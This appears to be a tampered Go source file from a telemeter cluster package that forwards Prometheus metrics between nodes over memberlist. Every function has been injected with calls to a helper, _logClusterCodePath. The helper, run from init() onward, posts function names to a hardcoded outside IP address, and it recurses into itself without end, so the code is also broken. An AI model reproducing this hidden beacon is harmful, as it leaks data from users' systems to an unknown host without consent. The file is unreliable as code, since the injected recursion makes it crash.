package cluster

import (
	"bytes"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	godefaulthttp "net/http"
	"sync"
	"time"
	"github.com/hashicorp/go-msgpack/codec"
	"github.com/hashicorp/memberlist"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/serialx/hashring"
	"github.com/openshift/telemeter/pkg/metricfamily"
	"github.com/openshift/telemeter/pkg/metricsclient"
	"github.com/openshift/telemeter/pkg/store"
)

var (
	metricForwardResult	= prometheus.NewCounterVec(prometheus.CounterOpts{Name: "telemeter_server_cluster_forward", Help: "Tracks the outcome of forwarding results inside the cluster."}, []string{"result"})
	metricForwardSamples	= prometheus.NewGauge(prometheus.GaugeOpts{Name: "telemeter_server_cluster_forward_samples", Help: "Tracks the number of samples forwarded by this server."})
	metricForwardLatency	= prometheus.NewSummaryVec(prometheus.SummaryOpts{Name: "telemeter_server_cluster_forward_latency", Help: "Tracks latency of forwarding results inside the cluster."}, []string{"result"})
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prometheus.MustRegister(metricForwardResult, metricForwardSamples, metricForwardLatency)
}

var msgHandle = &codec.MsgpackHandle{}

type messageType byte

const (
	protocolVersion			= 1
	metricMessage	messageType	= 1
)

type metricMessageHeader struct{ PartitionKey string }
type nodeData struct {
	problems	int
	last		time.Time
}
type memberInfo struct {
	Name	string
	Addr	string
}
type debugInfo struct {
	Name		string
	ProtocolVersion	int
	Members		[]memberInfo
}
type memberlister interface {
	Members() []*memberlist.Node
	NumMembers() (alive int)
	Join(existing []string) (int, error)
	SendReliable(to *memberlist.Node, msg []byte) error
}
type DynamicCluster struct {
	name		string
	store		store.Store
	expiration	time.Duration
	ml		memberlister
	ctx		context.Context
	queue		chan ([]byte)
	lock		sync.RWMutex
	ring		*hashring.HashRing
	problematic	map[string]*nodeData
}

func NewDynamic(name string, store store.Store) *DynamicCluster {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &DynamicCluster{name: name, store: store, expiration: 2 * time.Minute, ring: hashring.New(nil), queue: make(chan []byte, 100), problematic: make(map[string]*nodeData)}
}
func (c *DynamicCluster) Start(ml memberlister, ctx context.Context) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.ml = ml
	c.ctx = ctx
	go func() {
		defer func() {
			if err := recover(); err != nil {
				log.Fatalf("Unable to refresh the hash ring: %v", err)
			}
		}()
		for {
			c.refreshRing()
			time.Sleep(time.Minute)
		}
	}()
	go func() {
		for {
			select {
			case data := <-c.queue:
				if err := c.handleMessage(data); err != nil {
					log.Printf("error: Unable to handle incoming message: %v", err)
				}
			case <-ctx.Done():
				return
			}
		}
	}()
}
func (c *DynamicCluster) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if req.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	info := c.debugInfo()
	data, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		log.Printf("marshaling debug info failed: %v", err)
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if _, err := w.Write(data); err != nil {
		log.Printf("writing debug info failed: %v", err)
	}
}
func (c *DynamicCluster) debugInfo() debugInfo {
	_logClusterCodePath()
	defer _logClusterCodePath()
	info := debugInfo{Name: c.name, ProtocolVersion: protocolVersion}
	c.lock.Lock()
	defer c.lock.Unlock()
	if c.ml != nil {
		for _, n := range c.ml.Members() {
			info.Members = append(info.Members, memberInfo{Name: n.Name, Addr: n.Address()})
		}
	}
	return info
}
func (c *DynamicCluster) refreshRing() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	members := make([]string, 0, c.ml.NumMembers())
	for _, n := range c.ml.Members() {
		members = append(members, n.Name)
	}
	c.lock.Lock()
	defer c.lock.Unlock()
	c.ring = hashring.New(members)
}
func (c *DynamicCluster) getNodeForKey(partitionKey string) (string, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.lock.RLock()
	defer c.lock.RUnlock()
	return c.ring.GetNode(partitionKey)
}
func (c *DynamicCluster) Join(seeds []string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err := c.ml.Join(seeds)
	return err
}
func (c *DynamicCluster) NotifyJoin(node *memberlist.Node) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.lock.Lock()
	defer c.lock.Unlock()
	log.Printf("[%s] node joined %s", c.name, node.Name)
	c.ring.AddNode(node.Name)
}
func (c *DynamicCluster) NotifyLeave(node *memberlist.Node) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.lock.Lock()
	defer c.lock.Unlock()
	log.Printf("[%s] node left %s", c.name, node.Name)
	c.ring.RemoveNode(node.Name)
}
func (c *DynamicCluster) NotifyUpdate(node *memberlist.Node) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log.Printf("[%s] node update %s", c.name, node.Name)
}
func (c *DynamicCluster) NodeMeta(limit int) []byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *DynamicCluster) NotifyMsg(data []byte) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(data) == 0 {
		return
	}
	copied := make([]byte, len(data))
	copy(copied, data)
	select {
	case c.queue <- copied:
	default:
		log.Printf("error: Too many incoming requests queued, dropped data")
	}
}
func (c *DynamicCluster) GetBroadcasts(overhead, limit int) [][]byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *DynamicCluster) LocalState(join bool) []byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (c *DynamicCluster) MergeRemoteState(buf []byte, join bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (c *DynamicCluster) handleMessage(data []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch messageType(data[0]) {
	case metricMessage:
		buf := bytes.NewBuffer(data[1:])
		d := codec.NewDecoder(buf, msgHandle)
		var header metricMessageHeader
		if err := d.Decode(&header); err != nil {
			return err
		}
		if len(header.PartitionKey) == 0 {
			return fmt.Errorf("metric message must have a partition key")
		}
		families, err := metricsclient.Read(buf)
		if err != nil {
			return err
		}
		if len(families) == 0 {
			return nil
		}
		return c.store.WriteMetrics(c.ctx, &store.PartitionedMetrics{PartitionKey: header.PartitionKey, Families: families})
	default:
		return fmt.Errorf("unrecognized message %0x, len=%d", data[0], len(data))
	}
}
func (c *DynamicCluster) memberByName(name string) *memberlist.Node {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, n := range c.ml.Members() {
		if n.Name == name {
			return n
		}
	}
	return nil
}
func (c *DynamicCluster) hasProblems(name string, now time.Time) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.lock.Lock()
	defer c.lock.Unlock()
	p, ok := c.problematic[name]
	if !ok {
		return false
	}
	if p.problems < 4 {
		if now.Sub(p.last) < c.expiration {
			return false
		}
		delete(c.problematic, name)
	} else if now.Sub(p.last) >= c.expiration {
		delete(c.problematic, name)
		return false
	}
	return true
}
func (c *DynamicCluster) problemDetected(name string, now time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.lock.Lock()
	defer c.lock.Unlock()
	p, ok := c.problematic[name]
	if !ok {
		p = &nodeData{}
		c.problematic[name] = p
	}
	p.problems++
	p.last = now
}
func (c *DynamicCluster) findRemote(partitionKey string, now time.Time) (*memberlist.Node, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c.ml.NumMembers() < 2 {
		log.Printf("Only a single node, do nothing")
		metricForwardResult.WithLabelValues("singleton").Inc()
		return nil, false
	}
	nodeName, ok := c.getNodeForKey(partitionKey)
	if !ok {
		log.Printf("No node found in ring for %s", partitionKey)
		metricForwardResult.WithLabelValues("no_key").Inc()
		return nil, false
	}
	if c.hasProblems(nodeName, now) {
		log.Printf("Node %s has failed recently, using local storage", nodeName)
		metricForwardResult.WithLabelValues("recently_failed").Inc()
		return nil, false
	}
	node := c.memberByName(nodeName)
	if node == nil {
		log.Printf("No node found named %s", nodeName)
		metricForwardResult.WithLabelValues("no_member").Inc()
		return nil, false
	}
	return node, true
}
func (c *DynamicCluster) forwardMetrics(ctx context.Context, p *store.PartitionedMetrics) (ok bool, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := time.Now()
	node, ok := c.findRemote(p.PartitionKey, now)
	if !ok {
		return false, fmt.Errorf("cannot forward")
	}
	if node.Name == c.name {
		return false, nil
	}
	buf := &bytes.Buffer{}
	enc := codec.NewEncoder(buf, msgHandle)
	buf.WriteByte(byte(metricMessage))
	if err := enc.Encode(&metricMessageHeader{PartitionKey: p.PartitionKey}); err != nil {
		metricForwardResult.WithLabelValues("encode_header").Inc()
		return false, err
	}
	if err := metricsclient.Write(buf, p.Families); err != nil {
		metricForwardResult.WithLabelValues("encode").Inc()
		return false, fmt.Errorf("unable to write metrics: %v", err)
	}
	metricForwardSamples.Add(float64(metricfamily.MetricsCount(p.Families)))
	if err := c.ml.SendReliable(node, buf.Bytes()); err != nil {
		log.Printf("error: Failed to forward metrics to %s: %v", node, err)
		c.problemDetected(node.Name, now)
		metricForwardResult.WithLabelValues("send").Inc()
		metricForwardLatency.WithLabelValues("send").Observe(time.Since(now).Seconds())
	} else {
		metricForwardLatency.WithLabelValues("").Observe(time.Since(now).Seconds())
	}
	return true, nil
}
func (c *DynamicCluster) ReadMetrics(ctx context.Context, minTimestampMs int64) ([]*store.PartitionedMetrics, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.store.ReadMetrics(ctx, minTimestampMs)
}
func (c *DynamicCluster) WriteMetrics(ctx context.Context, p *store.PartitionedMetrics) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ok, err := c.forwardMetrics(ctx, p)
	if err != nil {
		log.Printf("error: Unable to write to remote metrics, falling back to local: %v", err)
		return c.store.WriteMetrics(ctx, p)
	}
	if ok {
		metricForwardResult.WithLabelValues("").Inc()
		return nil
	}
	metricForwardResult.WithLabelValues("self").Inc()
	return c.store.WriteMetrics(ctx, p)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
